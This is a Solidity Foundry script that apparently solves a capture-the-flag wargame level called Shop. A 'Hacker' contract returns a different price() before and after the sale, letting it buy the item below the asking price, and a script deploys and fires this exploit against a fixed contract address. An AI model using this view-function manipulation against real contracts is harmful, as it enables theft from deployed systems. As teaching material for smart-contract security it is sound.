// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Shop} from "../src/Shop.sol";

contract Hacker {
    Shop public code = Shop((0x4bA95F9C866dAab111f762b8e524e6eAB51F4Ce9));

    constructor() {}

    function attack() external {
        code.buy();
    }

    function price() external view returns (uint256) {
        if (code.isSold()) {
            return 99;
        }

        return 100;
    }
}

contract ShopSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIV"));
        Hacker hacker = new Hacker();
        hacker.attack();
        vm.stopBroadcast();
    }
}
